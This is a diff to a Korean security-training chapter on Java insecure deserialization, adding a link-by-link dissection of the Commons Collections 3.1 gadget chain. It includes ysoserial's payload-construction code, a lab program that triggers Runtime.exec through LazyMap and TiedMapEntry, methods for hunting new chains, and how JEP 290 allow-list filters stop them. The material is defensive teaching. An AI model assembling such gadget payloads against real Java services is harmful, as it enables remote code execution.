@@ -216,7 +216,7 @@ pickle.loads(payload)          # ← 이 줄에서 echo가 실행된다. 객체�
 | 3 | 시간 지연 가젯으로 코드 실행이 확인된다 | RCE 확인. Critical |
 | 4 | 실행 컨텍스트(사용자, 네트워크 위치) 확인 | 피해 범위 산정 |
 
-3단계에서 멈춘다. `id`나 `whoami` 출력이 필요하면 허가 범위를 다시 확인하고 OOB 채널로 결과만 받는다. 역직렬화 RCE는 거의 항상 Critical이며, 인증 전 진입점이면 더 그렇다. CVSS보다 "어디서 들어오는 바이트인가"가 심각도를 결정한다. [8부 2장](../part8-reporting/02-severity.md).
+3단계에서 멈춘다. `id`나 `whoami` 출력이 필요하면 허가 범위를 다시 확인하고 OOB 채널로 결과만 받는다. 역직렬화 RCE는 거의 항상 Critical이며, 인증 전 진입점이면 더 그렇다. CVSS보다 "어디서 들어오는 바이트인가"가 심각도를 결정한다. [보고 2장](../part8-reporting/02-severity.md).
 
 ## 6. 방어
 
@@ -251,6 +251,184 @@ pickle.loads(payload)          # ← 이 줄에서 echo가 실행된다. 객체�
 | 서명 검증 | 키가 소스 코드·설정 파일에 있고 다른 취약점(경로 조작, SSRF)으로 읽힌다 |
 
 **Log4Shell과의 관계**: [CVE-2021-44228](../part7-walkthroughs/01-cve-2021-44228-log4shell.md)은 JNDI 조회를 통해 원격 클래스를 로드하거나, 그것이 막힌 JDK에서는 **LDAP 응답 안의 직렬화 객체를 역직렬화**하는 경로로 RCE에 도달했다. 역직렬화 가젯이 다른 취약점의 2차 단계로 쓰이는 대표 사례다.
+
+### 7.1 가젯 체인 해부: Commons Collections 3.1
+
+우회를 이해하려면 체인 하나를 끝까지 읽어야 한다. "차단 목록이 왜 안 되는가"는 체인의 각 고리가 **얼마나 평범한 코드**인지 보면 저절로 답이 나온다. 여기서는 ysoserial의 `CommonsCollections6`(Matthias Kaiser)을 따라간다. JDK 버전을 타지 않는 가장 단순한 형태다. 소스의 주석에 적힌 호출 순서는 다음과 같다.
+
+```
+ObjectInputStream.readObject()
+  java.util.HashSet.readObject()
+    java.util.HashMap.put() → HashMap.hash()
+      TiedMapEntry.hashCode() → TiedMapEntry.getValue()
+        LazyMap.get()
+          ChainedTransformer.transform()
+            ConstantTransformer.transform()   → Runtime.class
+            InvokerTransformer.transform()    → Class.getMethod("getRuntime")
+            InvokerTransformer.transform()    → Method.invoke(null)  = Runtime 인스턴스
+            InvokerTransformer.transform()    → Runtime.exec(cmd)
+```
+
+고리마다 "어떤 메서드가, 어떤 조건에서, 무엇을 부르는가"를 적는다. 인용한 코드는 Commons Collections 3.1 소스 그대로다.
+
+**1. 진입점: `HashMap.readObject()`가 `hashCode()`를 부른다.** JDK의 `HashMap`은 역직렬화할 때 키·값 쌍을 하나씩 읽어 `putVal(hash(key), key, value, …)`로 다시 넣는다. `hash()`는 `key.hashCode()`를 호출한다. 즉 **`HashMap`의 키로 들어 있는 객체는 역직렬화 중에 반드시 `hashCode()`가 실행된다.** `HashSet.readObject()`도 내부 `HashMap`에 `map.put(e, PRESENT)`를 하므로 같다. 애플리케이션 코드가 `readObject()`의 반환값을 보기 전에 일어나는 일이다. 체인의 첫 고리는 JDK 자체이고, 어떤 필터도 `java.util.HashMap`을 막을 수는 없다.
+
+**2. `TiedMapEntry.hashCode()`가 `Map.get()`을 부른다.** `Map.Entry`의 규약은 "키의 해시 XOR 값의 해시"다. `TiedMapEntry`는 값을 자기 안에 두지 않고 **묶인(tied) 맵에서 그때그때 꺼내는** 엔트리다. 그래서 해시를 계산하려면 맵에 물어봐야 한다.
+
+```java
+// org.apache.commons.collections.keyvalue.TiedMapEntry (3.1)
+public Object getValue() {
+    return map.get(key);
+}
+public int hashCode() {
+    Object value = getValue();
+    return (getKey() == null ? 0 : getKey().hashCode()) ^
+           (value == null ? 0 : value.hashCode());
+}
+```
+
+`hashCode()`라는 "순수해 보이는" 메서드가 다른 객체의 `get()`으로 넘어가는 다리다. `map` 필드는 `Map` 인터페이스 타입이므로 공격자가 어떤 구현체든 넣을 수 있다. 같은 클래스의 `toString()`도 `getValue()`를 부르며, 그쪽은 `CommonsCollections5`의 다리가 된다.
+
+**3. `LazyMap.get()`이 없는 키를 만나면 `factory.transform(key)`를 부른다.** `LazyMap`은 "값이 없으면 팩토리로 만들어 넣는" 데코레이터다. 팩토리는 `Transformer` 인터페이스 타입이고 `Serializable`이다.
+
+```java
+// org.apache.commons.collections.map.LazyMap (3.1)
+public Object get(Object key) {
+    if (map.containsKey(key) == false) {
+        Object value = factory.transform(key);
+        map.put(key, value);
+        return value;
+    }
+    return map.get(key);
+}
+```
+
+조건은 하나, "키가 아직 없을 것". 공격자가 내부 맵을 빈 `HashMap`으로 두면 항상 만족한다. 이 지점부터 호출의 주체가 **데이터 구조에서 함수 객체로** 바뀐다.
+
+**4. `ChainedTransformer.transform()`은 변환기 배열을 순서대로 돌린다.** 앞 변환기의 출력이 뒤 변환기의 입력이 된다. 한 번의 `transform(key)` 호출이 여러 단계의 호출로 펼쳐지는 이유다.
+
+```java
+// org.apache.commons.collections.functors.ChainedTransformer (3.1)
+public Object transform(Object object) {
+    for (int i = 0; i < iTransformers.length; i++) {
+        object = iTransformers[i].transform(object);
+    }
+    return object;
+}
+```
+
+**5. `ConstantTransformer`는 입력을 버리고 상수를 돌려준다.** 체인의 첫 입력은 `LazyMap`의 키(ysoserial에서는 문자열 `"foo"`)인데 쓸모가 없다. `ConstantTransformer(Runtime.class)`가 그 자리를 `Runtime.class`로 바꿔 놓는다. 이것이 리플렉션의 출발점이다.
+
+**6. `InvokerTransformer`는 입력 객체의 메서드를 리플렉션으로 호출한다.** 이 클래스가 체인의 **싱크**다.
+
+```java
+// org.apache.commons.collections.functors.InvokerTransformer (3.1)
+public Object transform(Object input) {
+    if (input == null) { return null; }
+    try {
+        Class cls = input.getClass();
+        Method method = cls.getMethod(iMethodName, iParamTypes);
+        return method.invoke(input, iArgs);
+    } catch (NoSuchMethodException ex) { /* FunctorException */ }
+    …
+}
+```
+
+메서드 이름(`iMethodName`), 파라미터 타입, 인자(`iArgs`)가 모두 **직렬화되는 필드**다. 즉 "어떤 객체에 어떤 메서드를 어떤 인자로 부를지"를 바이트 스트림이 정한다. 그런데 `Runtime.getRuntime()`은 정적 메서드이고 `InvokerTransformer`는 항상 **입력 객체에 대해** 메서드를 호출하므로 한 번에 못 부른다. 그래서 세 개를 잇는다.
+
+| 순서 | 입력 | `input.getClass()` | 호출 | 출력 |
+|---|---|---|---|---|
+| ① | `Runtime.class` | `Class` | `Class.getMethod("getRuntime", [])` | `Method` 객체 |
+| ② | `Method` 객체 | `Method` | `Method.invoke(null, [])` | `Runtime` 인스턴스 |
+| ③ | `Runtime` 인스턴스 | `Runtime` | `Runtime.exec(cmd)` | `Process` |
+
+①에서 `Class` 클래스의 `getMethod`를, ②에서 `Method` 클래스의 `invoke`를 호출한다. **리플렉션으로 리플렉션을 부르는** 구조이고, 그래서 `Runtime` 자체는 `Serializable`이 아니어도 된다. 마지막에 `ConstantTransformer(1)`을 하나 더 붙여 `Process` 대신 정수 `1`이 `LazyMap`에 저장되게 한다. 반환값의 타입 때문에 체인이 중간에 예외로 끝나는 것을 막는 정리 단계다.
+
+**ysoserial은 이 객체 그래프를 어떻게 조립하는가.** `CommonsCollections6.getObject()`의 핵심은 다음과 같다(주석은 옮긴이).
+
+```java
+final Transformer[] transformers = new Transformer[] {
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class },
+                new Object[] { "getRuntime", new Class[0] }),
+        new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class },
+                new Object[] { null, new Object[0] }),
+        new InvokerTransformer("exec", new Class[] { String.class }, execArgs),
+        new ConstantTransformer(1) };
+Transformer transformerChain = new ChainedTransformer(transformers);
+final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);   // 3단계
+TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");                  // 2단계
+HashSet map = new HashSet(1);                                            // 1단계
+map.add("foo");
+// … 리플렉션으로 HashSet 내부 HashMap의 첫 노드를 찾아
+keyField.set(node, entry);   // 키 "foo"를 TiedMapEntry로 바꿔치기
+return map;
+```
+
+`map.add(entry)`로 직접 넣지 않고 `"foo"`를 넣은 뒤 리플렉션으로 바꿔치기하는 이유가 중요하다. `add()`는 `hashCode()`를 부르므로 **페이로드를 만드는 쪽에서 체인이 실행**돼 버린다. 체인은 생성 시점이 아니라 피해자의 `readObject()` 시점에만 돌아야 한다. `CommonsCollections1`이 `ChainedTransformer`를 먼저 무해한 배열로 만들고 나중에 `iTransformers` 필드를 리플렉션으로 교체하는 것("arm")도 같은 이유다.
+
+**체인을 손으로 밟아 보기.** 직렬화 없이, 각 고리를 자바 코드로 직접 호출하면 위 설명이 그대로 재현된다. 실습 환경에서 Commons Collections 3.1 jar를 클래스패스에 두고 실행한다. 명령은 자기 디렉터리에 표식 파일을 만드는 `touch`로 고정한다.
+
+```java
+// ChainSteps.java  (실습용. 직렬화 바이트를 만들거나 보내지 않는다)
+Object o = new ConstantTransformer(Runtime.class).transform("무시되는 입력");   // → class java.lang.Runtime
+o = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
+        new Object[]{"getRuntime", new Class[0]}).transform(o);               // → Method getRuntime
+o = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
+        new Object[]{null, new Object[0]}).transform(o);                       // → java.lang.Runtime@…
+Transformer[] ts = { /* 위 세 개 + */ new InvokerTransformer("exec",
+        new Class[]{String.class}, new Object[]{"touch /tmp/lab/marker"}), new ConstantTransformer(1) };
+Map lazy = LazyMap.decorate(new HashMap(), new ChainedTransformer(ts));
+lazy.get("foo");                                           // 5단계: 여기서 touch 실행
+new TiedMapEntry(lazy2, "foo").hashCode();                 // 6단계: hashCode 하나로 같은 결과
+new HashMap().put(new TiedMapEntry(lazy3, "foo"), 1);      // 7단계: readObject가 밟는 putVal 경로
+```
+
+`javac -cp commons-collections-3.1.jar ChainSteps.java && java -cp commons-collections-3.1.jar:. ChainSteps`로 돌리면 5·6·7단계마다 표식 파일이 생긴다. 7단계가 곧 `HashMap.readObject()`의 동작이다. 역직렬화 취약점은 "이상한 바이트"가 아니라 **`put` 한 번**으로 환원된다.
+
+### 7.2 가젯 체인을 직접 찾는 법
+
+알려진 체인이 막혔을 때 공격자가 하는 일이고, 분석가가 "이 클래스패스에 아직 체인이 남아 있는가"를 판단할 때 하는 일이다. 세 가지를 찾아 잇는다.
+
+**진입점(소스)**: 역직렬화 중 JVM이 자동으로 부르는 메서드.
+
+| 자동 호출 | 어디서 | ysoserial 예 |
+|---|---|---|
+| `readObject` / `readResolve` / `readExternal` | 그 메서드를 가진 모든 `Serializable` 클래스 | 거의 모든 체인의 첫 고리 |
+| `hashCode()` / `equals()` | `HashMap`·`HashSet`·`Hashtable`의 키 복원 | CC6 (`TiedMapEntry`), CC7 (`Hashtable`), `URLDNS` |
+| `compareTo()` / `Comparator.compare()` | `PriorityQueue`·`TreeMap`의 힙·트리 재구성 | CC2·CC4 (`TransformingComparator`, collections4) |
+| `toString()` | `BadAttributeValueExpException.readObject` | CC5 (`TiedMapEntry.toString`) |
+| `Map.entrySet()` 등 인터페이스 호출 | 동적 프록시의 `InvocationHandler.invoke` | CC1·CC3 (`AnnotationInvocationHandler`) |
+
+**싱크**: 임의 코드로 이어지는 마지막 호출. 리플렉션(`Method.invoke`, 위의 `InvokerTransformer`), 바이트코드 로딩(`TemplatesImpl.newTransformer()`가 필드 안의 클래스 바이트를 `defineClass`로 올린다. CC2·CC3·CC4가 쓴다), JNDI 조회(`JdbcRowSetImpl` 류), 스크립트 엔진, `ProcessBuilder`.
+
+**연결 고리**: "인터페이스 타입 필드를 갖고, 그 필드의 메서드를 부르는 `Serializable` 클래스". `TiedMapEntry.map`, `LazyMap.factory`, `ChainedTransformer.iTransformers`가 전부 이 모양이다. 공격자는 필드에 어떤 구현체든 넣을 수 있으므로, 인터페이스 호출 하나가 곧 "다음 고리를 고를 자유"다. 2018년 Black Hat에서 공개된 [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)(Ian Haken)는 바이트코드에서 이 세 가지를 자동으로 잇고, CodeQL로도 같은 질의를 쓸 수 있다. 수동으로는 클래스패스의 jar를 디컴파일해 `implements Serializable`과 `Transformer`·`Comparator`·`Map` 타입 필드를 grep하는 것부터 시작한다.
+
+**라이브러리 버전별 차이**: 같은 이름의 체인이 버전에 따라 되고 안 된다. ysoserial 소스의 `@Dependencies`와 `JavaVersion` 클래스가 그 조건을 코드로 적어 두었다.
+
+| 조건 | 영향 |
+|---|---|
+| Commons Collections 3.1~3.2.1 | CC1·CC3·CC5·CC6·CC7 전부 가능 |
+| Commons Collections 3.2.2 (2015-11) | `InvokerTransformer` 등 함수자의 역직렬화를 기본 차단. `org.apache.commons.collections.enableUnsafeSerialization=true`가 아니면 모든 CC 체인이 그 고리에서 끊긴다 |
+| collections4 4.0 | 패키지가 `org.apache.commons.collections4`로 바뀌어 3.x용 체인은 클래스를 못 찾는다. 대신 4.0에서 `TransformingComparator`가 `Serializable`이 되어 CC2·CC4(`PriorityQueue` 진입점)가 생겼다. 4.1에서 3.2.2와 같은 차단이 들어갔다 |
+| JDK 8u71 이하 | CC1·CC3의 진입점 `AnnotationInvocationHandler.readObject`가 프록시 맵의 `entrySet()`을 호출한다. 8u72부터 구현이 바뀌어 이 진입점이 사라졌다(`JavaVersion.isAnnInvHUniversalMethodImpl`: `update <= 71`) |
+| JDK 버전 무관 | CC6·CC7은 `HashMap`·`Hashtable`의 `hashCode` 호출만 쓰므로 JDK를 타지 않는다. 분석가가 "JDK가 최신이니 괜찮다"고 쓰면 틀리는 이유다 |
+
+### 7.3 JEP 290 필터는 체인을 어디서 끊는가
+
+`ObjectInputStream`은 클래스 서술자(class descriptor)를 읽을 때마다 필터를 호출한다. JDK 소스에서 `readNonProxyDesc()`는 `resolveClass()`로 클래스를 찾은 **직후, 다른 무엇도 읽기 전에** `filterCheck(cl, -1)`를 부른다. 거부되면 `InvalidClassException: filter status: REJECTED`로 스트림 전체가 중단된다. 그 시점에 일어난 일은 클래스 로딩뿐이다. 인스턴스가 만들어지지 않았고, 필드도 읽지 않았고, `readObject()`도 `hashCode()`도 호출되지 않았다.
+
+7.1의 체인을 허용 목록 `java.util.*;java.lang.*;!*`에 통과시키면 다음과 같이 된다.
+
+```
+HashSet                → java.util   허용
+  (요소 읽기) TiedMapEntry → org.apache.commons.collections.keyvalue   ✗ REJECTED
+    LazyMap, ChainedTransformer, Transformer[], InvokerTransformer … 는 읽히지도 않는다
+```
+
+필터는 스트림의 **첫 비허용 클래스 이름**에서 체인을 끊는다. 그래서 두 가지가 따라온다. 첫째, 허용 목록(`!*`로 끝나는)만이 "모르는 체인"까지 막는다. 차단 목록은 7.2에서 찾은 다음 고리가 나오면 끝이다. 둘째, 필터가 막지 못하는 것도 분명하다. 허용한 패키지 안에서만 이어지는 체인(`URLDNS`처럼 JDK 클래스만 쓰는 체인은 `java.*`를 허용하면 통과한다), 그리고 역직렬화가 아닌 경로(Jackson 다형 타입, XStream)는 이 필터의 영역이 아니다. `maxdepth`·`maxarray`·`maxrefs`·`maxbytes` 제한은 DoS용이지 RCE 체인을 막는 장치가 아니다.
+
+적용 범위도 확인한다. `ObjectInputStream.setObjectInputFilter()`는 그 스트림 하나에, `-Djdk.serialFilter=`는 JVM 전역에 걸린다. 전역 필터를 켜 두고 코드에서 스트림별 필터로 덮어쓰면 **덮어쓴 쪽이 이긴다**. JDK 17의 JEP 415는 `jdk.serialFilterFactory`로 "스트림별 필터와 전역 필터를 합치는" 팩토리를 두어 이 문제를 다룬다. 점검 보고서에는 "필터가 있다"가 아니라 "어느 스트림에 어떤 패턴이 걸려 있고, `!*`로 끝나는가"를 적는다.
 
 ## 8. 실제 CVE 사례
 
@@ -300,6 +478,9 @@ pickle.loads(payload)          # ← 이 줄에서 echo가 실행된다. 객체�
 - Chris Frohoff, Gabriel Lawrence, "Marshalling Pickles" (AppSec California, 2015) · [슬라이드](https://frohoff.github.io/appseccali-marshalling-pickles/) · 가젯 체인 개념의 출발점
 - Sam Thomas, "It's a PHP Unserialization Vulnerability Jim, but Not as We Know It" (Black Hat USA, 2018) · `phar://` 역직렬화
 - [Apache Commons statement on Java deserialisation (2015)](https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread) · 3.2.2 변경과 "유일한 가젯이 아니다"
+- [ysoserial `CommonsCollections6.java`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java) · 7.1절이 따라간 체인의 원 소스. 주석의 호출 순서와 `@Dependencies`·`JavaVersion` 조건
+- [JEP 415: Context-Specific Deserialization Filters](https://openjdk.org/jeps/415) · 스트림별 필터와 전역 필터의 결합 (JDK 17)
+- Ian Haken, [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector) (Black Hat USA, 2018) · 바이트코드에서 가젯 체인 자동 탐색
 - [PortSwigger Web Security Academy: Insecure deserialization](https://portswigger.net/web-security/deserialization) · 4.2절 랩
 
 ## 변경 이력
@@ -309,3 +490,4 @@ pickle.loads(payload)          # ← 이 줄에서 echo가 실행된다. 객체�
 | 2026-10-21 | 초안(뼈대) 작성 | @anthonynoh5202 |
 | 2026-10-22 | 10섹션 전체 작성. 언어별 패턴 4종, CVE 5건, pickle 재현 코드, PortSwigger 랩 목록 추가 | @anthonynoh5202 |
 | 2026-10-22 | 기술 검증: CVE 11건 레코드 대조(전부 실존). pickle 재현 코드 실행 확인 후 지문·json.loads 예외 종류 설명 보정. ObjectInputFilter 문법 Java로 실행 확인 | 검증팀 |
+| 2026-10-22 | 독자 테스트 반영: 7절을 🔴로 확장. Commons Collections 3.1 체인(CC6) 고리별 해부·ysoserial 소스 인용·단계별 자바 호출 실습, 가젯 체인 탐색법과 버전별 차이, JEP 290 차단 지점. 장 참조 표기 정리 | @anthonynoh5202 |
